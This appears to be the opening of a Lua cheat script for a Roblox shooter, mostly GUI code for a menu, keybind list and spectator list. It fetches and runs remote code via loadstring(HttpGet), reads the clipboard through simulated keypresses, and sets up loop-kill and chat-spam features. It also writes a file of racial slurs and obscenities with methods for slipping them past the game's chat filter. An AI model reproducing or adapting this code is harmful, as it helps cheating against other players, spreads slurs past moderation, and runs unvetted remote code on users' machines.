if game.CoreGui:FindFirstChild("electric boogalo") then return error('script is already executed or you executed another script')end
--getgenv().PasteDisabled = false
local wait = task.wait -- small test
getgenv().values = {} --blahwrlqwrqwr
local library = {tabs = {}}
local Signal = loadstring(game:HttpGet("https://gitfront.io/r/Samuel/Gw6t8rBAGPhN/My-scripts/raw/backup_signal.lua"))()
--------------------------------------------------------------
--local Api = loadstring(game:HttpGet("https://pastebin.com/raw/5L3wV43u"))() 
--local ConfigSave = Signal.new("ConfigSave") 
local ConfigLoad = Signal.new("ConfigLoad")
local ConfigLoad1 = Signal.new("ConfigLoad1")
--ConfigSave1 = Signal.new("ConfigSave") 
ConfigUpdateCfgList = Signal.new('ConfigUpdateCfgList')
ConfigUpdateCfgList2 = Signal.new('ConfigUpdateCfgList2')
--VisualizeSilentAngles = Signal.new('VisualizeSilentAngles')
hitlogs = Signal.new('hitlogs')
--MenuAccent = Signal.new('MenuAccent')
function insertwithoutdupes(tab, thethingyouneedtoinsert) -- my own code :sunglasses:
	if not table.find(tab, thethingyouneedtoinsert) then
		table.insert(tab, thethingyouneedtoinsert)
	end
end	
function removewithoutdupes(tab, thethingyouneedtoremove) -- my own code :sunglasses:
	if table.find(tab, thethingyouneedtoremove) then
		table.remove(tab, table.find(tab, thethingyouneedtoremove))
	end
end	

function GetTextBounds(Text, Font, Size)
    return game:GetService('TextService'):GetTextSize(Text, Size, Font, (game.CoreGui:FindFirstChildWhichIsA('ScreenGui').AbsoluteSize)).X;
end;

--cache real

local C = {
['Vec2'] = Vector2.new,
['Vec3'] = Vector3.new,
['CF'] = CFrame.new,
['INST'] = Instance.new,
['COL3'] = Color3.new, 

['COL3RGB'] = Color3.fromRGB, 
['COL3HSV'] = Color3.fromHSV, 

['CLAMP'] = math.clamp, 

['DEG'] = math.deg, 
['FLOOR'] = math.floor, 
['ACOS'] = math.acos, 

['math.random'] = math.random, 
['ATAN2'] = math.atan2, 

['HUGE'] = math.huge, 
['RAD'] = math.rad,

['MIN'] = math.min,
['POW'] = math.pow,

['UDIM2'] = UDim2.new, 
['CFAngles'] = CFrame.Angles, 

['FIND'] = string.find, 
['LEN'] = string.len, 
['SUB'] = string.sub, 
['GSUB'] = string.gsub, 
['RAY'] = Ray.new,

['INSERT'] = table.insert, 
['TBLFIND'] = table.find, 
['TBLREMOVE'] = table.remove, 
['TBLSORT'] = table.sort 
}

local makeDraggable = function(frame)
				dragging = false 
					local a = frame
					local dragInput 
					local dragStart 
					local startPos 
					local function update(input) 
						local delta = input.Position - dragStart 
						a.Position = C.UDIM2(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) 
					end 
					a.InputBegan:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
							dragging = true 
							dragStart = input.Position 
							startPos = a.Position 

							input.Changed:Connect(function() 
								if input.UserInputState == Enum.UserInputState.End then 
									dragging = false 
								end 
							end) 
						end 
					end) 
					a.InputChanged:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then 
							dragInput = input 
						end 
					end) 
					game:GetService('UserInputService').InputChanged:Connect(function(input) 
						if input == dragInput and dragging then 
							update(input) 
						end 
					end)
end


getclipboard = function()
repeat wait() until iswindowactive()
   local ScreenGui = C.INST("ScreenGui")
   ScreenGui.Name = tostring(math.random(10000,999999))
   ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
   ScreenGui.Parent = game.CoreGui
   
   local clipboard = C.INST("TextBox")
   clipboard.Name = "clipboard"
   clipboard.AnchorPoint = C.Vec2(0.5, 0.5)
   clipboard.Size = C.UDIM2(0, 200, 0, 50)
   clipboard.BackgroundTransparency = 1
   clipboard.Position = C.UDIM2(0.5, 0, 0.5, 0)
   clipboard.Text = ""
   clipboard.TextTransparency = 1
   
   clipboard.Parent = ScreenGui
   clipboard:CaptureFocus()
   keypress(0x11)
   keypress(0x56)
wait()
   keyrelease(0x56)
   keyrelease(0x11)
       local value = clipboard.Text
       ScreenGui:Destroy()
       return value
   end
local function GetTeam(plr)
	return game.Teams[plr.Team.Name]
end   


local bordercolorlist = {}

function toInteger(color)
	return C.FLOOR(color.r*255)*256^2+C.FLOOR(color.g*255)*256+C.FLOOR(color.b*255)
end

function toHex(color)
	local int = toInteger(color)
	
	local current = int
	local final = ""
	
	local hexChar = {
		"A", "B", "C", "D", "E", "F"
	}
	
	repeat local remainder = current % 16
		local char = tostring(remainder)
		
		if remainder >= 10 then
			char = hexChar[1 + remainder - 10]
		end
		
		current = C.FLOOR(current/16)
		final = final..char
	until current <= 0
	
	return "#"..string.reverse(final)
end

function findtextrandom(text)
    if text:find(' @r ') then 
        local b = text:split(' @r ')
        return b[math.random(#b)]
    else 
        return text
    end
end

--[[ some guide for me because i'm retard in string
string.split(text, from-to letter) example string.split('nig.ger, '.') will return table nig and ger
C.GSUB(text, change what, change to what)
string.find(text, what to find)




--]]

function textboxtriggers(text)
	local triggers = {
		['@user'] = game.Players.LocalPlayer.Name,
		['@ping'] = string.split(game.Stats.PerformanceStats.Ping:GetValue(), '.')[1],
		['@time'] = os.date('%H:%M:%S'),
	}

	if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild('Humanoid') then 
		triggers['@health'] = game.Players.LocalPlayer.Character.Humanoid.Health
	end

	for a,b in next, triggers do 
		text = C.GSUB(text, a, b)
	end

	return findtextrandom(text)
end

local txt = game:GetService("TextService") 
function library:Tween(...) game:GetService("TweenService"):Create(...):Play() end 
--local cfglocation = "pastedstormy/pastedstormycfgs/"
 
--makefolder("pastedstormy") 
--makefolder("pastedstormy/pastedstormycfgs/")
 
local cfglocation = "SamuelPaste_cw/cfgs/"
makefolder('SamuelPaste_cw')
makefolder('SamuelPaste_cw/cfgs')


if not isfile('SamuelPaste_cw/customkillsay.txt') then
	writefile('SamuelPaste_cw/customkillsay.txt', "message1\
message2\
message3"
)
end

if not isfile('SamuelPaste_cw/customchatspam.txt') then
	writefile('SamuelPaste_cw/customchatspam.txt', "message1\
message2\
message3"
)
end
if not isfile('SamuelPaste_cw/customantitags.txt') then
	writefile('SamuelPaste_cw/customantitags.txt', "--METHOD 1 = IN MIDDLE, METHOD 2 = AFTER, METHOD 3 = INFRONT, METHOD 4 = SECOND TYPE OF ANTI TAGS \
	['uc'] = {\
        FULLWORD = {\
            ['fuck'] = 1\
        },\
        METHOD = 1\
    },\
    ['gg'] = {\
        FULLWORD = {\
            ['nigga'] = 1,\
            ['nigger'] = 2\
        },\
        METHOD = 1\
    },\
    ['hit'] = {\
        FULLWORD = {\
            ['hitler'] = 1\
        },\
        METHOD = 1\
    },\
    ['rs'] = {\
        FULLWORD = {\
            ['niggers'] = 1\
        },\
        METHOD = 2\
    },\
    ['ss'] = {\
        FULLWORD = {\
            ['pussy'] = 1\
        },\
        METHOD = 2\
    },\
    ['rn'] = {\
        FULLWORD = {\
            ['horny'] = 1\
        },\
        METHOD = 3\
    },\
    ['rd'] = {\
        FULLWORD = {\
            ['retard'] = 1\
        },\
        METHOD = 1\
    },\
    ['gi'] = {\
        FULLWORD = {\
            ['vagina'] = 1\
        },\
        METHOD = 1\
    },\
    ['x'] = {\
        FULLWORD = {\
            ['sex'] = 1\
        },\
        METHOD = 2\
    }"
)
end


local Players = game:GetService("Players") 
local LocalPlayer = Players.LocalPlayer 


local MainUIColor = Color3.fromRGB(255,20,147)


--getgenv().planting = false
--getgenv().defusing = false
-- i see those pastes lying around\

getgenv().loopkillplr = {}


for _,v in pairs(game.Players:GetPlayers()) do 
	C.INSERT(loopkillplr, v.Name)
end

	if #loopkillplr == 0 then
		C.INSERT(loopkillplr, 'none')
	end

																																																																												-- Bad 9672 & WetIDreamz 0001 & zeox 9999												
getgenv().emojis = {
	[":clown:"] = utf8.char(129313);
	[":cold_face:"] = utf8.char(129398);
	[":neutral:"] = utf8.char(128528);
	[":sob:"] = utf8.char(128557);
}

--[[if #allcfgs == 0 then
INSERT(allcfgs, 'shit so script wont crash')
end--]]

function tbltorgb(tbl) 
	return C.COL3(tbl.R, tbl.G, tbl.B) 
end 
local function deepCopy(original) 
	local copy = {} 
	for k, v in pairs(original) do 
		if type(v) == "table" then 
			v = deepCopy(v) 
		end 
		copy[k] = v 
	end 
	return copy 
end 
function library:ConfigFix(cfg) 
	local copy = game:GetService("HttpService"):JSONDecode(readfile(cfglocation..cfg..".txt")) 
	for i,Tabs in pairs(copy) do 
		for i,Sectors in pairs(Tabs) do 
			for i,Elements in pairs(Sectors) do 
				if Elements.Color ~= nil then 
					local a = Elements.Color 
					Elements.Color = tbltorgb(a) 
				end 
			end 
		end 
	end 
	return copy 
end 

function library:ConfigFix1(cfg) 
	local copy = game:GetService("HttpService"):JSONDecode(readfile(cfglocation..cfg.."")) 
	for i,Tabs in pairs(copy) do 
		for i,Sectors in pairs(Tabs) do 
			for i,Elements in pairs(Sectors) do 
				if Elements.Color ~= nil then 
					local a = Elements.Color 
					Elements.Color = tbltorgb(a) 
				end 
			end 
		end 
	end 
	return copy 
end 

function library:SaveConfig(cfg) 
	local copy = deepCopy(values) 
	for i,Tabs in pairs(copy) do 
		for i,Sectors in pairs(Tabs) do 
			for i,Elements in pairs(Sectors) do 
				if Elements.Color ~= nil then 
					Elements.Color = {R=Elements.Color.R, G=Elements.Color.G, B=Elements.Color.B} 
				end 
			end 
		end 
	end 
	writefile(cfglocation..cfg..".txt", game:GetService("HttpService"):JSONEncode(copy)) 
end 

function library:SaveConfig1(cfg) 
	local copy = deepCopy(values) 
	for i,Tabs in pairs(copy) do 
		for i,Sectors in pairs(Tabs) do 
			for i,Elements in pairs(Sectors) do 
				if Elements.Color ~= nil then 
					Elements.Color = {R=Elements.Color.R, G=Elements.Color.G, B=Elements.Color.B} 
				end 
			end 
		end 
	end 
	writefile(cfglocation..cfg.."", game:GetService("HttpService"):JSONEncode(copy)) 
end 
local ovascreengui = nil
			function library:New(name) 
				local menu = {} 
				local Lunar = C.INST("ScreenGui") 
				local Menu = C.INST("ImageLabel")
				local TextLabel = C.INST("TextLabel") 
				local TabButtons = C.INST("Frame") 
				local UIListLayout = C.INST("UIListLayout") 
				local Tabs = C.INST("Frame") 
				--local ImageLabel = C.INST('ImageLabel')

				Lunar.Name = "electric boogalo" 
				Lunar.ResetOnSpawn = false 
				Lunar.ZIndexBehavior = "Global" 
				Lunar.DisplayOrder = 420133769 

				local UIScale = C.INST("UIScale") 
				UIScale.Parent = Lunar 

				function menu:SetScale(scale) 
					UIScale.Scale = scale 
				end 



				local but = C.INST("TextButton") 
				but.Modal = true 
				but.Text = "" 
				but.BackgroundTransparency = 1 
				but.Parent = Lunar 

				local cursor = C.INST("ImageLabel") 
				cursor.Name = "cursor" 
				cursor.Parent = Lunar 
				cursor.BackgroundTransparency = 1 
				cursor.Size = C.UDIM2(0,17,0,17) 
				cursor.Image = "rbxassetid://518398610" 
				cursor.ZIndex = 1000 
				cursor.ImageColor3 = C.COL3RGB(255,255,255) 
				
				
				local Mouse = LocalPlayer:GetMouse() 

				game:GetService('RunService').RenderStepped:connect(function() 
					cursor.Visible = Lunar.Enabled 
					cursor.Position = C.UDIM2(0,Mouse.X-3,0,Mouse.Y+1) 
				end) 

				Menu.Name = "Menu"
				Menu.Parent = Lunar
				Menu.BackgroundColor3 = C.COL3RGB(255, 255, 255)
				Menu.BorderColor3 = C.COL3RGB(0, 0, 0)
				Menu.Position = C.UDIM2(0.5, -300, 0.5, -300)
				Menu.Size = C.UDIM2(0, 600, 0, 610)
				Menu.Image = ""
				Menu.ImageColor3 = C.COL3RGB(180, 180, 180)
				
				--[[ImageLabel.Parent = Lunar
				ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255)
				ImageLabel.BorderColor3 = C.COL3RGB(0, 0, 0)
				ImageLabel.Position = C.UDIM2(0.5, -300, 0.5, -300)
				ImageLabel.Size = C.UDIM2(0, 600, 0, 610)
				ImageLabel.Image = "rbxassetid://8893436115"--]]

				library.uiopen = true 
	ovascreengui = { 
		['ova'] = Lunar,
		['menu'] = Menu,
		['cursor'] = cursor,
	} 
			
			local SpectatorsList = C.INST("ScreenGui")
do
			local Spectators = C.INST("Frame")
			local Container = C.INST("Frame")
			local UIPadding = C.INST("UIPadding")
			local Text = C.INST("TextLabel")
			local Players = C.INST("TextLabel")
			local Background = C.INST("Frame")
			local UIGradient = C.INST("UIGradient")
			local Color = C.INST("Frame")
			local UIGradient_2 = C.INST("UIGradient")

			SpectatorsList.Parent = game.CoreGui
			SpectatorsList.Name = "SpectatorsList"
			SpectatorsList.Enabled = false

			Spectators.Name = "Spectators"
			Spectators.Parent = SpectatorsList
			Spectators.BackgroundColor3 = C.COL3RGB(23, 23, 23)
			Spectators.BackgroundTransparency = 1.000
			Spectators.BorderColor3 = C.COL3RGB(20, 20, 20)
			Spectators.Position = C.UDIM2(0.00800000038, 0, 0.400000006, 49)
			Spectators.Size = C.UDIM2(0, 200, 0, 20)

			Container.Name = "Container"
			Container.Parent = Spectators
			Container.BackgroundTransparency = 1.000
			Container.BorderSizePixel = 0
			Container.Position = C.UDIM2(0, 0, 0, 4)
			Container.Size = C.UDIM2(1, 0, 0, 14)
			Container.ZIndex = 3

			UIPadding.Parent = Container
			UIPadding.PaddingLeft = UDim.new(0, 4)

			Text.Name = "Text"
			Text.Parent = Container
			Text.BackgroundTransparency = 1.000
			Text.Size = C.UDIM2(1, 0, 1, 0)
			Text.ZIndex = 4
			Text.Font = Enum.Font.Code
			Text.Text = "spectators"
			Text.TextColor3 = C.COL3RGB(65025, 65025, 65025)
			Text.TextSize = 13.000
			Text.TextStrokeTransparency = 0.000

			Players.Name = "Players"
			Players.Parent = Container
			Players.BackgroundTransparency = 1.000
			Players.Position = C.UDIM2(0.0196080022, 0, 1.44285719, 0)
			Players.Size = C.UDIM2(0.980391979, 0, 1.14285719, 0)
			Players.ZIndex = 4
			Players.Font = Enum.Font.Code
			Players.Text = "loading"
			Players.TextColor3 = C.COL3RGB(65025, 65025, 65025)
			Players.TextSize = 12.000
			Players.TextStrokeTransparency = 0.000
			Players.TextYAlignment = Enum.TextYAlignment.Top

			Background.Name = "Background"
			Background.Parent = Spectators
			Background.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			Background.BorderColor3 = C.COL3RGB(20, 20, 20)
			Background.Size = C.UDIM2(1, 0, 1, 0)

			UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(22, 22, 22)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(22, 22, 22))}
			UIGradient.Rotation = 90
			UIGradient.Parent = Background

			Color.Name = "Color"
			Color.Parent = Spectators
			Color.BackgroundColor3 = MainUIColor
			Color.BorderSizePixel = 0
			Color.Size = C.UDIM2(1, 0, 0, 2)
			Color.ZIndex = 2

			--[[UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, C.COL3RGB(255,20,147)), ColorSequenceKeypoint.new(1, MainUIColor)}
			UIGradient_2.Rotation = 90
			UIGradient_2.Parent = Color--]]

			function GetSpectators()
				local CurrentSpectators = ""
				for i,v in pairs(game.Players:GetChildren()) do 
					pcall(function()
						if v ~= game.Players.LocalPlayer then
							if not v.Character then 
								if (v.CameraCF.Value.p - game.Workspace.CurrentCamera.CFrame.p).Magnitude < 10 then 
									if CurrentSpectators == "" then
											CurrentSpectators = v.Name
										else
											CurrentSpectators = CurrentSpectators.. "\n" ..v.Name
										end
									end
								end
							end
						end)
					end
				return CurrentSpectators
			end

			spawn(function()
				while wait(0.1) do
					if SpectatorsList.Enabled then
						Players.Text = GetSpectators()
					end
				end
			end)
		
			local function SCUAM_fake_script() -- Spectators.LocalScript 
				local script = C.INST('LocalScript', Spectators)
				local gui = script.Parent
				gui.Draggable = true
				gui.Active = true
			end
			coroutine.wrap(SCUAM_fake_script)()
			end
				function library:SetSpectatorVisible(rit)
					SpectatorsList.Enabled = rit
				end		

	--[[local KeybindList = C.INST("ScreenGui") 
	do 
		local TextLabel = C.INST("TextLabel") 
		local Frame = C.INST("Frame") 
		local UIListLayout = C.INST("UIListLayout") 

		KeybindList.Name = "KeybindList" 
		KeybindList.ZIndexBehavior = Enum.ZIndexBehavior.Global 
		KeybindList.Enabled = false 

		TextLabel.Parent = KeybindList 
		TextLabel.BackgroundColor3 = C.COL3RGB(0, 0, 0) 
		TextLabel.BorderColor3 = MainUIColor
		TextLabel.Position = C.UDIM2(0, 1, 0.300000012, 0) 
		TextLabel.Size = C.UDIM2(0, 155, 0, 24) 
		TextLabel.ZIndex = 2 
		TextLabel.Font = Enum.Font.SourceSansSemibold 
		TextLabel.Text = "keybinds" 
		TextLabel.TextColor3 = C.COL3RGB(255, 255, 255) 
		TextLabel.TextSize = 14.000 

		Frame.Parent = TextLabel 
		Frame.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
		Frame.BackgroundTransparency = 1.000 
		Frame.Position = C.UDIM2(0, 0, 1, 1) 
		Frame.Size = C.UDIM2(1, 0, 1, 0) 

		UIListLayout.Parent = Frame 
		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

		KeybindList.Parent = game.CoreGui 
	end--]]

		local KeybindList = Instance.new("ScreenGui")
		do
		local Grad = Instance.new("Frame")
		local Frame = Instance.new("Frame")
		local Frame_2 = C.INST('Frame')
		local UIGradient = Instance.new("UIGradient")
		local TextLabel = Instance.new("TextLabel")
		local Keybinds = Instance.new("TextLabel")
		local UIListLayout = C.INST('UIListLayout')

		--Properties:

		KeybindList.Parent = game.CoreGui
		KeybindList.Enabled = false
		KeybindList.Name = 'KeybindList'

		Frame.Parent = KeybindList
		Frame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
		Frame.Position = UDim2.new(0, 0, 0.366762191, 0)
		Frame.Size = UDim2.new(0, 60, 0, 20)
		Frame.ZIndex = 694201337

		Grad.Name = "Grad"
		Grad.Parent = Frame
		Grad.BackgroundColor3 = MainUIColor
		Grad.BorderSizePixel = 0
		Grad.Position = UDim2.new(0, 1, 0, -1)
		Grad.Size = UDim2.new(0, 60, 0, 2)
		Grad.ZIndex = 694201337

		UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(11, 11, 11)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
		UIGradient.Rotation = 90
		UIGradient.Parent = Frame

		Keybinds.Name = "Keybinds"
		Keybinds.Parent = Frame
		Keybinds.Active = true
		Keybinds.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Keybinds.BackgroundTransparency = 1.000
		Keybinds.LayoutOrder = 1
		Keybinds.Position = UDim2.new(0, 0, 0, 0)
		Keybinds.Size = UDim2.new(0, 60, 0, 20)
		Keybinds.ZIndex = 694201337
		Keybinds.Font = Enum.Font.SourceSans
		Keybinds.LineHeight = 1.190
		Keybinds.Text = "Keybinds"
		Keybinds.TextColor3 = Color3.fromRGB(255, 255, 255)
		Keybinds.TextSize = 14.000
		Keybinds.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
		
		Frame_2.Parent = Frame
		Frame_2.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
		Frame_2.Position = UDim2.new(0, 0, 1, 0)
		Frame_2.Size = UDim2.new(0, 60, 0, 28)
		Frame_2.Visible = false
		
		UIListLayout.Parent = Frame_2 
		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
		UIListLayout.SortOrder = Enum.SortOrder.Name
		--[[TextLabel.Parent = Frame
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.Position = UDim2.new(0, 0, 0.926934123, 0)
		TextLabel.Size = UDim2.new(0, 183, 0, 20)
		TextLabel.Font = Enum.Font.SourceSans
		TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
		TextLabel.TextSize = 14.000
		TextLabel.TextXAlignment = Enum.TextXAlignment.Left--]]
		makeDraggable(Frame)
		end
		
		local keybindss = {}
		local biggestkeybind
		
	function keybindadd(text,keybind) 
	if KeybindList.Frame.Frame:FindFirstChild(text) then 
		KeybindList.Frame.Frame:FindFirstChild(text):Destroy(); 
		KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size - C.UDIM2(0,0,0,10); 
	end
		if not KeybindList.Frame.Frame:FindFirstChild(text) then 
			local TextLabel = C.INST("TextLabel")
			--local size = GetTextBounds(''..text..''..keybind..'', Enum.Font.Code, 14)
			--[[if size >= (KeybindList.Frame.Size.X - 8) then
			KeybindList.Frame.Size = C.UDIM2(0, Size + 8, 0, 20)
			KeybindList.Frame.Grad.Size = C.UDIM2(0,KeybindList.Frame.Size.X, 0,4)
			KeybindList.Frame.Frame.Size = C.UDIM2(0, Size + 8, 0, 20 * #keybindss)
			end--]]
			--[[TextLabel.BackgroundColor3 = C.COL3RGB(1, 1, 1) 
			TextLabel.BorderColor3 = C.COL3RGB(255,20,147) 
			TextLabel.
			TextLabel.BorderSizePixel = 0 
			TextLabel.Size = C.UDIM2(0, 170, 0, 20) 
			TextLabel.ZIndex = 2 
			TextLabel.Font = Enum.Font.SourceSansSemibold 
			TextLabel.Text = ""..text.." : Enabled"
			TextLabel.TextColor3 = C.COL3RGB(255, 255, 255) 
			TextLabel.TextSize = 14.000 
			TextLabel.Name = text 
			TextLabel.Parent = KeybindList.TextLabel.Frame --]]
			local Size = GetTextBounds("["..keybind..'] '..text..'', Enum.Font.SourceSans, 14)
			local XOriginalSize = KeybindList.Frame.Frame.Size.X.Offset
			local XScale = Size
			
			if XScale >= XOriginalSize then
				KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size + C.UDIM2(0, Size,0,10)
				KeybindList.Frame.Size = KeybindList.Frame.Size + C.UDIM2(0, Size, 0, 0)
				KeybindList.Frame.Grad.Size = KeybindList.Frame.Grad.Size + C.UDIM2(0, Size, 0 ,0)
			else
				KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size + C.UDIM2(0,0,0,10)
			end
				if KeybindList.Frame.Frame.Size == C.UDIM2(0,60,0,28) then
					KeybindList.Frame.Frame.Visible = false
					KeybindList.Frame.Size = C.UDIM2(0,60,0,20)
					KeybindList.Frame.Grad.Size = C.UDIM2(0,60,0, 2)
				else
					KeybindList.Frame.Frame.Visible = true
				end
			TextLabel.Name = text
			TextLabel.Parent = KeybindList.Frame.Frame
			TextLabel.Active = true
			TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.LayoutOrder = 1
			TextLabel.Position = UDim2.new(0,10,0,0)
			TextLabel.Size = UDim2.new(0, 60, 0, 20)
			TextLabel.ZIndex = 694201337
			TextLabel.Font = Enum.Font.SourceSans
			TextLabel.LineHeight = 1.190
			TextLabel.Text = "["..keybind..'] '..text..''
			TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
		end 
	end 
		
	function keybindtoggle(text) 
		KeybindList.Frame.Frame:FindFirstChild(text).Text = KeybindList.Frame.Frame:FindFirstChild(text).Text..' : Enabled'
	end 
					function keybindhold(text)
						KeybindList.Frame.Frame:FindFirstChild(text).Text = KeybindList.Frame.Frame:FindFirstChild(text).Text..' : Held'
					end

	function keybindremove(text, keybind) 
		if KeybindList.Frame.Frame:FindFirstChild(text) and KeybindList.Frame.Frame:FindFirstChild(text).Text then

			KeybindList.Frame.Frame:FindFirstChild(text):Destroy()
			KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size - C.UDIM2(0,0,0,10)
					if not KeybindList.Frame.Frame:FindFirstChild(text) then 
			local TextLabel = C.INST("TextLabel")
			--local size = GetTextBounds(''..text..''..keybind..'', Enum.Font.Code, 14)
			--[[if size >= (KeybindList.Frame.Size.X - 8) then
			KeybindList.Frame.Size = C.UDIM2(0, Size + 8, 0, 20)
			KeybindList.Frame.Grad.Size = C.UDIM2(0,KeybindList.Frame.Size.X, 0,4)
			KeybindList.Frame.Frame.Size = C.UDIM2(0, Size + 8, 0, 20 * #keybindss)
			end--]]
			--[[TextLabel.BackgroundColor3 = C.COL3RGB(1, 1, 1) 
			TextLabel.BorderColor3 = C.COL3RGB(255,20,147) 
			TextLabel.
			TextLabel.BorderSizePixel = 0 
			TextLabel.Size = C.UDIM2(0, 170, 0, 20) 
			TextLabel.ZIndex = 2 
			TextLabel.Font = Enum.Font.SourceSansSemibold 
			TextLabel.Text = ""..text.." : Enabled"
			TextLabel.TextColor3 = C.COL3RGB(255, 255, 255) 
			TextLabel.TextSize = 14.000 
			TextLabel.Name = text 
			TextLabel.Parent = KeybindList.TextLabel.Frame --]]
			local Size = GetTextBounds("["..keybind..'] '..text..'', Enum.Font.SourceSans, 14)
			local XOriginalSize = KeybindList.Frame.Frame.Size.X.Offset
			local XScale = Size
			
			if XScale >= XOriginalSize then
				KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size + C.UDIM2(0, Size,0,10)
			else
				KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size + C.UDIM2(0,0,0,10)
			end
				if KeybindList.Frame.Frame.Size == C.UDIM2(0,60,0,28) then
					KeybindList.Frame.Frame.Visible = false
					KeybindList.Frame.Size = C.UDIM2(0,60,0,20)
					KeybindList.Frame.Grad.Size = C.UDIM2(0,60,0, 2)
				else
					KeybindList.Frame.Frame.Visible = true
				end
			TextLabel.Name = text
			TextLabel.Parent = KeybindList.Frame.Frame
			TextLabel.Active = true
			TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.LayoutOrder = 1
			TextLabel.Position = UDim2.new(0,10,0,0)
			TextLabel.Size = UDim2.new(0, 60, 0, 20)
			TextLabel.ZIndex = 694201337
			TextLabel.Font = Enum.Font.SourceSans
			TextLabel.LineHeight = 1.190
			TextLabel.Text = "["..keybind..'] '..text..''
			TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
		end 
				if KeybindList.Frame.Frame.Size == C.UDIM2(0,60,0,28) then
					KeybindList.Frame.Frame.Visible = false
					KeybindList.Frame.Size = C.UDIM2(0,60,0,20)
					KeybindList.Frame.Grad.Size = C.UDIM2(0,60,0, 2)
				else
					KeybindList.Frame.Frame.Visible = true
				end
		end
	end 

	function keybindremove2(text) 
		if KeybindList.Frame.Frame:FindFirstChild(text) then
				
				KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size - C.UDIM2(0,0,0,10)
				local XOffset = KeybindList.Frame.Frame.Size.X.Offset
				if XOffset <= 60 then
					--KeybindList.Frame.Frame.Size.X.Offset = 60
					KeybindList.Frame.Frame.Size = C.UDIM2(KeybindList.Frame.Frame.Size.X.Scale, 60, KeybindList.Frame.Frame.Size.Y.Scale, KeybindList.Frame.Frame.Size.Y.Offset)
				end
				if KeybindList.Frame.Frame.Size.Y.Offset == 28 then
					--KeybindList.Frame.Frame.Size.X.Offset = 60
					KeybindList.Frame.Frame.Size = C.UDIM2(KeybindList.Frame.Frame.Size.X.Scale, 60, KeybindList.Frame.Frame.Size.Y.Scale, KeybindList.Frame.Frame.Size.Y.Offset)
				end
				if KeybindList.Frame.Frame.Size == C.UDIM2(0,60,0,28) then
					KeybindList.Frame.Frame.Visible = false
					KeybindList.Frame.Size = C.UDIM2(0,60,0,20)
					KeybindList.Frame.Grad.Size = C.UDIM2(0,60,0, 2)
				else
					KeybindList.Frame.Frame.Visible = true
				end
			KeybindList.Frame.Frame:FindFirstChild(text):Destroy() 
		end 
	end 

	function library:SetKeybindVisible(Joe) 
		KeybindList.Enabled = Joe 
	end 
				library.dragging = false 
				do 
					local UserInputService = UserInputService
					local a = Menu 
					local dragInput 
					local dragStart 
					local startPos 
					local function update(input) 
						local delta = input.Position - dragStart 
						a.Position = C.UDIM2(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) 
					end 
					a.InputBegan:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
							library.dragging = true 
							dragStart = input.Position 
							startPos = a.Position 

							input.Changed:Connect(function() 
								if input.UserInputState == Enum.UserInputState.End then 
									library.dragging = false 
								end 
							end)
						end 
					end) 
					a.InputChanged:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then 
							dragInput = input 
						end 
					end) 
					game:GetService('UserInputService').InputChanged:Connect(function(input) 
						if input == dragInput and library.dragging then 
							update(input) 
						end 
					end) 
				end 

				local Holder = C.INST("Frame")	

				Holder.Name = "Holder"
				Holder.Parent = Menu
				Holder.BackgroundColor3 = C.COL3RGB(25, 25, 25)
				Holder.BackgroundTransparency = 0.400
				Holder.BorderColor3 = C.COL3RGB(7, 0, 0)
				Holder.Position = C.UDIM2(0, 0, 0, -26)
				Holder.Size = C.UDIM2(0, 600, 0, 25)


					TextLabel.Parent = Holder
					TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255)
					TextLabel.BackgroundTransparency = 1.000
					TextLabel.Position = C.UDIM2(0, 8, 0, 0)
					TextLabel.Size = C.UDIM2(0, 570, 0, 23)
					TextLabel.Font = Enum.Font.Ubuntu
					TextLabel.Text = "SamuelPaste"
					TextLabel.TextColor3 = C.COL3RGB(255, 255, 255)
